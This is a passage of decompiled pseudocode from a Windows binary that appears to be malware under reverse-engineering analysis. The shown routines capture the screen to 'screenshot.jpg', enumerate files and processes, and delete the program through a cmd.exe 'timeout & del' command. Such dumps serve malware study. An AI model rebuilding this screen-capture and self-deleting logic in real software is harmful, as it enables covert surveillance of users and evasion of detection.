  FUN_003a57a0((int *)&stack0xffffff18);
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar1);
  return;
}



void __fastcall FUN_003a57a0(int *param_1)

{
  undefined **ppuVar1;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c2eab;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  ppuVar1 = (undefined **)(param_1 + 0x18);
  *(undefined ***)(*(int *)(*param_1 + 4) + -0x60 + (int)ppuVar1) =
       std::basic_stringstream<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
       vftable;
  local_8 = 0;
  FUN_003a69a0((undefined **)(param_1 + 6));
  local_8 = 0xffffffff;
  *(undefined ***)(*(int *)(*param_1 + 4) + -0x60 + (int)ppuVar1) =
       std::basic_iostream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)(*(int *)(param_1[4] + 4) + -0x50 + (int)ppuVar1) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  *(undefined ***)(*(int *)(*param_1 + 4) + -0x60 + (int)ppuVar1) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  *ppuVar1 = (undefined *)std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)ppuVar1);
  *in_FS_OFFSET = local_10;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a5840(void)

{
  int iVar1;
  undefined4 *in_EAX;
  undefined4 *puVar2;
  size_t sVar3;
  int **_Str;
  int *piVar4;
  undefined *unaff_EDI;
  
  iVar1 = in_EAX[4];
  puVar2 = in_EAX;
  if (7 < (uint)in_EAX[5]) {
    puVar2 = (undefined4 *)*in_EAX;
  }
  sVar3 = (*_DAT_003d94b8)(0,0,puVar2,iVar1 + 1,0,0,0,0);
  _Str = (int **)FUN_003ae40b(sVar3);
  if (7 < (uint)in_EAX[5]) {
    in_EAX = (undefined4 *)*in_EAX;
  }
  (*_DAT_003d94b8)(0,0,in_EAX,iVar1 + 1,_Str,sVar3,0,0);
  *(undefined4 *)(unaff_EDI + 0x14) = 0xf;
  *(undefined4 *)(unaff_EDI + 0x10) = 0;
  *unaff_EDI = 0;
  piVar4 = (int *)_strlen((char *)_Str);
  FUN_003894c0(unaff_EDI,_Str,piVar4);
  FUN_003b14b9(_Str);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a58e0(void)

{
  int iVar1;
  undefined4 *in_EAX;
  undefined4 *puVar2;
  uint uVar3;
  wchar_t *_Str;
  int *piVar4;
  undefined2 *unaff_EDI;
  
  iVar1 = in_EAX[4];
  puVar2 = in_EAX;
  if (0xf < (uint)in_EAX[5]) {
    puVar2 = (undefined4 *)*in_EAX;
  }
  uVar3 = (*_DAT_003d9394)(0,0,puVar2,iVar1 + 1,0,0);
  _Str = (wchar_t *)
         FUN_003ae40b(-(uint)((int)((ulonglong)uVar3 * 2 >> 0x20) != 0) |
                      (uint)((ulonglong)uVar3 * 2));
  if (0xf < (uint)in_EAX[5]) {
    in_EAX = (undefined4 *)*in_EAX;
  }
  (*_DAT_003d9394)(0,0,in_EAX,iVar1 + 1,_Str,uVar3);
  *(undefined4 *)(unaff_EDI + 10) = 7;
  *(undefined4 *)(unaff_EDI + 8) = 0;
  *unaff_EDI = 0;
  piVar4 = (int *)str_len(_Str);
  FUN_003a5120(unaff_EDI,piVar4);
  FUN_003b14b9(_Str);
  return;
}



undefined4 FUN_003a5990(undefined4 param_1,undefined4 param_2)

{
  int **in_FS_OFFSET;
  undefined *local_ac [20];
  undefined **local_5c [18];
  undefined4 local_14;
  int *local_10;
  undefined *puStack12;
  uint local_8;
  
  puStack12 = &LAB_003c3d7f;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 0;
  local_14 = 0;
  FUN_003a6f70((int *)local_ac);
  local_8 = 1;
  FUN_003a6430((int *)local_ac);
  FUN_003a7050();
  local_14 = 1;
  *(undefined ***)((int)local_ac + *(int *)(local_ac[0] + 4)) =
       std::basic_ostringstream<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
       vftable;
  local_8 = 2;
  FUN_003a69a0(local_ac + 1);
  local_8 = local_8 & 0xffffff00;
  *(undefined ***)((int)local_ac + *(int *)(local_ac[0] + 4)) =
       std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;
  local_5c[0] = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)local_5c);
  *in_FS_OFFSET = local_10;
  return param_1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_003a5af0(undefined4 param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 extraout_EDX;
  undefined *unaff_ESI;
  undefined uVar3;
  int *local_10c [65];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar3 = 0;
  iVar1 = (*_DAT_003d9510)(0x410,0,param_1);
  if (iVar1 != 0) {
    (*_DAT_003d954c)(iVar1,0,local_10c,0x104);
    (*_DAT_003d93b8)(iVar1);
  }
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar2 = (int *)_strlen((char *)local_10c);
  FUN_003894c0(unaff_ESI,local_10c,piVar2);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar3);
  return;
}



// WARNING: Could not reconcile some variable overlaps

void __thiscall FUN_003a5b90(void *this,void *param_1)

{
  undefined4 *lpFileName;
  HANDLE hFindFile;
  int *piVar1;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar3;
  int **in_FS_OFFSET;
  uint in_stack_00000018;
  undefined in_stack_fffffd50;
  _WIN32_FIND_DATAW local_2a0;
  void *local_50;
  undefined4 local_40;
  uint local_3c;
  undefined4 local_34;
  undefined4 local_24;
  uint local_20;
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3a9a;
  local_10 = *in_FS_OFFSET;
  local_18 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 1;
  lpFileName = (undefined4 *)FUN_003a58e0();
  if (7 < (uint)lpFileName[5]) {
    lpFileName = (undefined4 *)*lpFileName;
  }
  hFindFile = FindFirstFileW((LPCWSTR)lpFileName,(LPWIN32_FIND_DATAW)&local_2a0);
  if (7 < local_3c) {
    FUN_003aee4b(local_50);
  }
  local_3c = 7;
  local_40 = 0;
  local_50 = (void *)((uint)local_50 & 0xffff0000);
  *(undefined4 *)this = 0;
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 8) = 0;
  local_20 = 7;
  local_24 = 0;
  local_34 = (int *)((uint)local_34._2_2_ << 0x10);
  piVar1 = (int *)str_len(local_2a0.cFileName);
  FUN_003a5120(&local_34,piVar1);
  local_8._0_1_ = 2;
  FUN_003a7070((int **)&local_34);
  local_8 = CONCAT31(local_8._1_3_,1);
  if (7 < local_20) {
    FUN_003aee4b(local_34);
  }
  iVar2 = FindNextFileW(hFindFile,(LPWIN32_FIND_DATAW)&local_2a0);
  uVar3 = extraout_EDX;
  while (iVar2 != 0) {
    local_20 = 7;
    local_24 = 0;
    local_34 = (int *)((uint)local_34 & 0xffff0000);
    piVar1 = (int *)str_len(local_2a0.cFileName);
    FUN_003a5120(&local_34,piVar1);
    local_8._0_1_ = 3;
    FUN_003a7070((int **)&local_34);
    local_8 = CONCAT31(local_8._1_3_,1);
    if (7 < local_20) {
      FUN_003aee4b(local_34);
    }
    iVar2 = FindNextFileW(hFindFile,(LPWIN32_FIND_DATAW)&local_2a0);
    uVar3 = extraout_EDX_00;
  }
  if (0xf < in_stack_00000018) {
    FUN_003aee4b(param_1);
    uVar3 = extraout_EDX_01;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,uVar3,in_stack_fffffd50);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 FUN_003a5d40(void)

{
  int iVar1;
  int iVar2;
  undefined8 local_c;
  
  iVar1 = (*_DAT_003d93b4)();
  if (iVar1 != -1) {
    iVar2 = (*_DAT_003d936c)(iVar1,&local_c);
    if (iVar2 != 0) {
      (*_DAT_003d93b8)(iVar1);
      return local_c;
    }
    (*_DAT_003d93b8)(iVar1);
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a5da0(void)

{
  uint uVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  undefined4 extraout_EDX;
  int **in_FS_OFFSET;
  undefined uVar4;
  undefined4 local_170;
  undefined4 local_16c;
  undefined4 local_168;
  undefined *local_164;
  char *local_160;
  undefined *local_15c;
  undefined4 local_158;
  undefined4 local_154;
  undefined4 local_150;
  void *local_134;
  undefined4 local_124;
  uint local_120;
  undefined local_118 [260];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c302b;
  local_10 = *in_FS_OFFSET;
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_14 = uVar1;
  trim_string((undefined (*) [16])local_118,0,0x104);
  trim_string((undefined (*) [16])&local_170,0,0x3c);
  (*_DAT_003d9520)(local_118,&DAT_003d1adc,uVar1);
  (*_DAT_003d9520)(local_118,"timeout /t 6 & del /f /q \"");
  uVar2 = (*_DAT_003d9494)();
  puVar3 = (undefined4 *)FUN_003a5af0(uVar2);
  local_8 = 0;
  if (0xf < (uint)puVar3[5]) {
    puVar3 = (undefined4 *)*puVar3;
  }
  (*_DAT_003d9520)(local_118,puVar3);
  local_8 = 0xffffffff;
  if (0xf < local_120) {
    FUN_003aee4b(local_134);
  }
  uVar4 = 0xfc;
  local_120 = 0xf;
  local_124 = 0;
  local_134 = (void *)((uint)local_134 & 0xffffff00);
  (*_DAT_003d9520)(local_118);
  local_15c = local_118;
  local_170 = 0x3c;
  local_16c = 0;
  local_168 = 0;
  local_164 = &DAT_003d0a90;
  local_160 = "C:\\Windows\\System32\\cmd.exe";
  local_158 = 0;
  local_154 = 0;
  local_150 = 0;
  (*_DAT_003d9584)(&local_170);
  trim_string((undefined (*) [16])&local_170,0,0x3c);
  trim_string((undefined (*) [16])local_118,0,0x104);
  (*_DAT_003d9484)(0);
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint __cdecl FUN_003a5f30(undefined4 *param_1)

{
  size_t sVar1;
  undefined (*lorem_ipsum) [16];
  int iVar2;
  undefined (*pauVar3) [16];
  uint uVar4;
  size_t local_c;
  uint local_8;
  
  uVar4 = 0;
  local_8 = 0;
  local_c = 0;
  (*_DAT_003d93e4)(&local_8,&local_c);
  sVar1 = local_c;
  if (local_c == 0) {
    return 0xffffffff;
  }
  lorem_ipsum = (undefined (*) [16])_malloc(local_c);
  if (lorem_ipsum != (undefined (*) [16])0x0) {
    (*_DAT_003d9434)(local_8,sVar1,lorem_ipsum);
    if (local_8 != 0) {
      pauVar3 = lorem_ipsum[3];
      do {
        iVar2 = (*_DAT_003d94e4)(*(undefined4 *)*pauVar3,L"image/jpeg");
        if (iVar2 == 0) {
          iVar2 = uVar4 * 0x4c + (int)lorem_ipsum;
          *param_1 = *(undefined4 *)(uVar4 * 0x4c + (int)lorem_ipsum);
          param_1[1] = *(undefined4 *)(iVar2 + 4);
          param_1[2] = *(undefined4 *)(iVar2 + 8);
          param_1[3] = *(undefined4 *)(iVar2 + 0xc);
          trim_string(lorem_ipsum,0,0);
          return uVar4;
        }
        uVar4 = uVar4 + 1;
        pauVar3 = (undefined (*) [16])(pauVar3[4] + 0xc);
      } while (uVar4 < local_8);
    }
  }
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a5fe0(void)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar6;
  undefined unaff_DI;
  undefined8 uVar7;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  int local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined local_28 [8];
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18 [4];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_3c = DAT_003d92ec;
  local_58 = 1;
  local_54 = 0;
  local_50 = 0;
  local_4c = 0;
  trim_string((undefined (*) [16])&local_58,0,0x10);
  local_58 = 1;
  uVar7 = (*_DAT_003d952c)(&local_40,&local_58,0);
  uVar6 = (undefined4)((ulonglong)uVar7 >> 0x20);
  if ((int)uVar7 == 0) {
    uVar7 = (*_DAT_003d948c)(0,1,&local_30);
    uVar6 = (undefined4)((ulonglong)uVar7 >> 0x20);
    if ((int)uVar7 == 0) {
      uVar1 = (*_DAT_003d9378)();
      (*_DAT_003d95c4)(uVar1,local_28);
      uVar2 = (*_DAT_003d95a0)(uVar1);
      uVar3 = (*_DAT_003d9450)(uVar2);
      local_34 = (*_DAT_003d93bc)(uVar2,local_20,local_1c);
      local_44 = (*_DAT_003d939c)(uVar3,local_34);
      (*_DAT_003d937c)(uVar3,0,0,local_20,local_1c,uVar2,0,0,0xcc0020);
      uVar7 = (*_DAT_003d94ec)(local_34,0,&local_2c);
      uVar6 = (undefined4)((ulonglong)uVar7 >> 0x20);
      if ((int)uVar7 == 0) {
        uVar4 = FUN_003a5f30(local_18);
        uVar6 = extraout_EDX;
        if (uVar4 != 0xffffffff) {
          uVar7 = (*_DAT_003d94c0)(local_2c,local_30,local_18,0);
          uVar6 = (undefined4)((ulonglong)uVar7 >> 0x20);
          if ((int)uVar7 == 0) {
            (*_DAT_003d9388)(local_30,&local_38);
            local_48 = (*_DAT_003d93cc)(local_38);
            iVar5 = (*_DAT_003d9360)(local_38);
            FUN_003ae280(extraout_ECX,"\\screenshot.jpg",local_48,iVar5);
            (*_DAT_003d939c)(uVar3,local_44);
            (*_DAT_003d9400)(local_2c);
            (*_DAT_003d950c)(local_40);
            (*_DAT_003d9538)(local_34);
            (*_DAT_003d9538)(uVar3);
            (*_DAT_003d9524)(uVar1,uVar2);
            (*_DAT_003d9594)(uVar1);
            uVar6 = extraout_EDX_00;
          }
        }
      }
    }
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar6,unaff_DI);
  return;
}



void __cdecl FUN_003a6180(char *param_1)

{
  HANDLE hObject;
  int iVar1;
  undefined4 extraout_EDX;
  undefined uVar2;
  undefined4 local_138 [9];
  char local_114 [264];
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_138[0] = 0x128;
  hObject = (HANDLE)CreateToolhelp32Snapshot(2,0);
  iVar1 = Process32First(hObject,local_138);
  if (iVar1 != 0) {
    iVar1 = Process32Next(hObject,local_138);
    while (iVar1 != 0) {
      __stricmp(local_114,param_1);
      iVar1 = Process32Next(hObject,local_138);
    }
  }
  uVar2 = SUB41(param_1,0);
  CloseHandle(hObject);
  terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,extraout_EDX,uVar2);
  return;
}



// WARNING: Could not reconcile some variable overlaps

int * FUN_003a6240(int *param_1,undefined4 param_2)

{
  int *piVar1;
  int iVar2;
  uint *puVar3;
  uint uVar4;
  void *this;
  code **ppcVar5;
  int **in_FS_OFFSET;
  uint uStack68;
  uint local_34 [2];
  int *local_2c;
  undefined local_28;
  int *local_24;
  uint local_20;
  uint local_1c;
  uint local_18;
  uint *local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c34b2;
  local_10 = *in_FS_OFFSET;
  uStack68 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_14 = &uStack68;
  *in_FS_OFFSET = (int *)&local_10;
  piVar1 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
  local_18 = 0;
  local_2c = param_1;
  puVar3 = &uStack68;
  if (piVar1 != (int *)0x0) {
    (**(code **)(*piVar1 + 4))();
    puVar3 = local_14;
  }
  local_14 = puVar3;
  local_8 = 0;
  if ((*(int *)(*(int *)(*param_1 + 4) + 0xc + (int)param_1) == 0) &&
     (*(int *)(*(int *)(*param_1 + 4) + 0x3c + (int)param_1) != 0)) {
    FUN_003a1860();
  }
  local_28 = *(int *)(*(int *)(*param_1 + 4) + 0xc + (int)param_1) == 0;
  local_8 = 1;
  if ((bool)local_28) {
    FUN_00399850();
    local_8._0_1_ = 2;
    local_24 = (int *)FUN_003a8bb0();
    local_8._0_1_ = 1;
    if (local_1c != 0) {
      std::_Lockit::_Lockit((_Lockit *)&local_20,0);
      iVar2 = *(int *)(local_1c + 4);
      if ((iVar2 != 0) && (iVar2 != -1)) {
        *(int *)(local_1c + 4) = iVar2 + -1;
      }
      iVar2 = *(int *)(local_1c + 4);
      FUN_003ae995((int *)&local_20);
      ppcVar5 = (code **)(~-(uint)(iVar2 != 0) & local_1c);
      if (ppcVar5 != (code **)0x0) {
        (**(code **)*ppcVar5)(1);
      }
    }
    local_8 = CONCAT31(local_8._1_3_,3);
    iVar2 = *(int *)(*param_1 + 4);
    local_34[0] = local_34[0] & 0xffffff00;
    local_20 = local_20 & 0xffffff00 | (uint)*(byte *)(iVar2 + 0x40 + (int)param_1);
    (**(code **)(*local_24 + 0x1c))
              (local_34,local_34[0],*(undefined4 *)(iVar2 + 0x38 + (int)param_1),
               *(int *)(*param_1 + 4) + (int)param_1,local_20,param_2);
    if ((char)local_34[0] != '\0') {
      local_18 = 4;
    }
  }
  local_8 = 1;
  this = (void *)(*(int *)(*param_1 + 4) + (int)param_1);
  if (local_18 != 0) {
    uVar4 = *(uint *)((int)this + 0xc) | local_18;
    if (*(int *)((int)this + 0x38) == 0) {
      uVar4 = uVar4 | 4;
    }
    *(uint *)((int)this + 0xc) = uVar4 & 0x17;
    if ((*(uint *)((int)this + 0x10) & uVar4 & 0x17) != 0) {
      FUN_00399780(this,(char *)0x0);
    }
  }
  local_8 = 5;
  uVar4 = _SRP_Verify_A_mod_N();
  if ((char)uVar4 == '\0') {
    FUN_003a7f20(param_1);
  }
  local_8 = 0xffffffff;
  piVar1 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
  if (piVar1 != (int *)0x0) {
    (**(code **)(*piVar1 + 8))();
  }
  *in_FS_OFFSET = local_10;
  return param_1;
}



undefined * Catch_All_003a6374(void)

{
  uint uVar1;
  void *this;
  int unaff_EBP;
  
  this = (void *)(*(int *)(**(int **)(unaff_EBP + 8) + 4) + (int)*(int **)(unaff_EBP + 8));
  uVar1 = *(uint *)((int)this + 0xc) & 0x17 | 4;
  *(uint *)((int)this + 0xc) = uVar1;
  if ((*(uint *)((int)this + 0x10) & uVar1) != 0) {
    FUN_00399780(this,(char *)0x1);
  }
  *(undefined4 *)(unaff_EBP + -4) = 1;
  return &DAT_003a63ac;
}



// WARNING: Could not reconcile some variable overlaps

int * FUN_003a6430(int *param_1)

{
  int *piVar1;
  int iVar2;
  uint *puVar3;
  uint uVar4;
  void *this;
  code **ppcVar5;
  int **in_FS_OFFSET;
  uint uStack68;
  uint local_34 [2];
  int *local_2c;
  undefined local_28;
  int *local_24;
  uint local_20;
  uint local_1c;
  uint local_18;
  uint *local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3472;
  local_10 = *in_FS_OFFSET;
  uStack68 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_14 = &uStack68;
  *in_FS_OFFSET = (int *)&local_10;
  piVar1 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
  local_18 = 0;
  local_2c = param_1;
  puVar3 = &uStack68;
  if (piVar1 != (int *)0x0) {
    (**(code **)(*piVar1 + 4))();
    puVar3 = local_14;
  }
  local_14 = puVar3;
  local_8 = 0;
  if ((*(int *)(*(int *)(*param_1 + 4) + 0xc + (int)param_1) == 0) &&
     (*(int *)(*(int *)(*param_1 + 4) + 0x3c + (int)param_1) != 0)) {
    FUN_003a1860();
  }
  local_28 = *(int *)(*(int *)(*param_1 + 4) + 0xc + (int)param_1) == 0;
  local_8 = 1;
  if ((bool)local_28) {
    FUN_00399850();
    local_8._0_1_ = 2;
    local_24 = (int *)FUN_003a8bb0();
    local_8._0_1_ = 1;
    if (local_1c != 0) {
      std::_Lockit::_Lockit((_Lockit *)&local_20,0);
      iVar2 = *(int *)(local_1c + 4);
      if ((iVar2 != 0) && (iVar2 != -1)) {
        *(int *)(local_1c + 4) = iVar2 + -1;
      }
      iVar2 = *(int *)(local_1c + 4);
      FUN_003ae995((int *)&local_20);
      ppcVar5 = (code **)(~-(uint)(iVar2 != 0) & local_1c);
      if (ppcVar5 != (code **)0x0) {
        (**(code **)*ppcVar5)();
      }
    }
    local_8 = CONCAT31(local_8._1_3_,3);
    iVar2 = *(int *)(*param_1 + 4);
    local_34[0] = local_34[0] & 0xffffff00;
    local_20 = local_20 & 0xffffff00 | (uint)*(byte *)(iVar2 + 0x40 + (int)param_1);
    (**(code **)(*local_24 + 0xc))
              (local_34,local_34[0],*(undefined4 *)(iVar2 + 0x38 + (int)param_1),
               *(int *)(*param_1 + 4) + (int)param_1,local_20);
    if ((char)local_34[0] != '\0') {
      local_18 = 4;
    }
  }
  local_8 = 1;
  this = (void *)(*(int *)(*param_1 + 4) + (int)param_1);
  if (local_18 != 0) {
    uVar4 = *(uint *)((int)this + 0xc) | local_18;
    if (*(int *)((int)this + 0x38) == 0) {
      uVar4 = uVar4 | 4;
    }
    *(uint *)((int)this + 0xc) = uVar4 & 0x17;
    if ((*(uint *)((int)this + 0x10) & uVar4 & 0x17) != 0) {
      FUN_00399780(this,(char *)0x0);
    }
  }
  local_8 = 5;
  uVar4 = _SRP_Verify_A_mod_N();
  if ((char)uVar4 == '\0') {
    FUN_003a7f20(param_1);
  }
  local_8 = 0xffffffff;
  piVar1 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
  if (piVar1 != (int *)0x0) {
    (**(code **)(*piVar1 + 8))();
  }
  *in_FS_OFFSET = local_10;
  return param_1;
}



undefined * Catch_All_003a6569(void)

{
  uint uVar1;
  void *this;
  int unaff_EBP;
  
  this = (void *)(*(int *)(**(int **)(unaff_EBP + 8) + 4) + (int)*(int **)(unaff_EBP + 8));
  uVar1 = *(uint *)((int)this + 0xc) & 0x17 | 4;
  *(uint *)((int)this + 0xc) = uVar1;
  if ((*(uint *)((int)this + 0x10) & uVar1) != 0) {
    FUN_00399780(this,(char *)0x1);
  }
  *(undefined4 *)(unaff_EBP + -4) = 1;
  return &DAT_003a65a1;
}



int * FUN_003a6620(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  uint *puVar1;
  int *piVar2;
  uint uVar3;
  undefined4 uVar4;
  void *this;
  int **in_FS_OFFSET;
  longlong lVar5;
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3a40;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  param_1[2] = 0;
  param_1[3] = 0;
  piVar2 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
  local_18 = 0;
  if (piVar2 != (int *)0x0) {
    (**(code **)(*piVar2 + 4))();
  }
  local_8 = 0;
  uVar4 = FUN_003a2920();
  if ((char)uVar4 != '\0') {
    local_8 = 2;
    lVar5 = (**(code **)(**(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1) + 0x20))
                      (param_2,param_3,param_4);
    puVar1 = (uint *)(param_1 + 2);
    uVar3 = *puVar1;
    *puVar1 = *puVar1 + (uint)lVar5;
    param_1[3] = param_1[3] + (int)((ulonglong)lVar5 >> 0x20) + (uint)CARRY4(uVar3,(uint)lVar5);
    if (lVar5 != CONCAT44(param_4,param_3)) {
      local_18 = 3;
    }
  }
  local_8 = 1;
  this = (void *)(*(int *)(*param_1 + 4) + (int)param_1);
  if (local_18 != 0) {
    local_18 = *(uint *)((int)this + 0xc) | local_18;
    if (*(int *)((int)this + 0x38) == 0) {
      local_18 = local_18 | 4;
    }
    *(uint *)((int)this + 0xc) = local_18 & 0x17;
    if ((*(uint *)((int)this + 0x10) & local_18 & 0x17) != 0) {
      FUN_00399780(this,(char *)0x0);
    }
  }
  local_8 = 0xffffffff;
  piVar2 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
  if (piVar2 != (int *)0x0) {
    (**(code **)(*piVar2 + 8))();
  }
  *in_FS_OFFSET = local_10;
  return param_1;
}



undefined * Catch_All_003a66c6(void)

{
  uint uVar1;
  void *this;
  int unaff_EBP;
  
  this = (void *)(*(int *)(**(int **)(unaff_EBP + 8) + 4) + (int)*(int **)(unaff_EBP + 8));
  uVar1 = *(uint *)((int)this + 0xc) & 0x17 | 4;
  *(uint *)((int)this + 0xc) = uVar1;
  if ((*(uint *)((int)this + 0x10) & uVar1) != 0) {
    FUN_00399780(this,(char *)0x1);
  }
  *(undefined4 *)(unaff_EBP + -4) = 1;
  return &DAT_003a66fe;
}



void FUN_003a6760(undefined4 param_1)

{
  uint uVar1;
  uint uVar2;
  void *this;
  int *unaff_ESI;
  uint local_20;
  int local_1c;
  uint local_18;
  
  if ((*(byte *)(*(int *)(*unaff_ESI + 4) + 0xc + (int)unaff_ESI) & 6) == 0) {
    (**(code **)(**(int **)(*(int *)(*unaff_ESI + 4) + 0x38 + (int)unaff_ESI) + 0x28))
              (&local_20,0,0,param_1,1);
    if ((local_18 + local_20 == -1) &&
       (((int)local_18 >> 0x1f) + local_1c + (uint)CARRY4(local_18,local_20) == -1)) {
      uVar1 = *(uint *)(*(int *)(*unaff_ESI + 4) + 0xc + (int)unaff_ESI);
      this = (void *)(*(int *)(*unaff_ESI + 4) + (int)unaff_ESI);
      uVar2 = uVar1 | 2;
      if (*(int *)((int)this + 0x38) == 0) {
        uVar2 = uVar1 | 6;
      }
      *(uint *)((int)this + 0xc) = uVar2 & 0x17;
      if ((*(uint *)((int)this + 0x10) & uVar2 & 0x17) != 0) {
        FUN_00399780(this,(char *)0x0);
      }
    }
  }
  return;
}



// WARNING: Could not reconcile some variable overlaps

undefined ** FUN_003a67e0(undefined **param_1,undefined4 *param_2)

{
  undefined **ppuVar1;
  undefined *puVar2;
  undefined uVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  void *pvVar7;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3d32;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  *param_1 = (undefined *)&PTR_003d17b8;
  param_1[0x1a] = (undefined *)std::basic_ios<char,struct_std::char_traits<char>_>::vftable;
  local_8 = 0;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) =
       std::basic_istream<char,struct_std::char_traits<char>_>::vftable;
  param_1[2] = (undefined *)0x0;
  param_1[3] = (undefined *)0x0;
  pvVar7 = (void *)(*(int *)(*param_1 + 4) + (int)param_1);
  FUN_00399890();
  ppuVar1 = param_1 + 4;
  *(undefined ***)((int)pvVar7 + 0x38) = ppuVar1;
  *(undefined4 *)((int)pvVar7 + 0x3c) = 0;
  uVar3 = FUN_003a2fa0((uint)pvVar7,0x20);
  *(undefined *)((int)pvVar7 + 0x40) = uVar3;
  if ((*(int *)((int)pvVar7 + 0x38) == 0) &&
     (uVar4 = *(uint *)((int)pvVar7 + 0xc) & 0x17 | 4, *(uint *)((int)pvVar7 + 0xc) = uVar4,
     (*(uint *)((int)pvVar7 + 0x10) & uVar4) != 0)) {
    FUN_00399780(pvVar7,(char *)0x0);
  }
  local_8 = 2;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) =
       std::basic_ifstream<char,struct_std::char_traits<char>_>::vftable;
  FUN_003a2e70(ppuVar1);
  param_1[8] = (undefined *)(param_1 + 6);
  param_1[0xc] = (undefined *)(param_1 + 10);
  param_1[0xd] = (undefined *)(param_1 + 0xb);
  *ppuVar1 = (undefined *)std::basic_filebuf<char,struct_std::char_traits<char>_>::vftable;
  *(undefined *)(param_1 + 0x18) = 0;
  *(undefined *)((int)param_1 + 0x59) = 0;
  param_1[9] = (undefined *)(param_1 + 7);
  param_1[0x10] = (undefined *)(param_1 + 0xe);
  param_1[0x11] = (undefined *)(param_1 + 0xf);
  param_1[7] = (undefined *)0x0;
  *(undefined4 *)param_1[0xd] = 0;
  *(undefined4 *)param_1[0x11] = 0;
  *(undefined4 *)param_1[8] = 0;
  puVar2 = DAT_003d9818;
  *(undefined4 *)param_1[0xc] = 0;
  *(undefined4 *)param_1[0x10] = 0;
  param_1[0x19] = (undefined *)0x0;
  param_1[0x17] = puVar2;
  param_1[0x15] = (undefined *)0x0;
  local_8 = CONCAT31(local_8._1_3_,3);
  if (0xf < (uint)param_2[5]) {
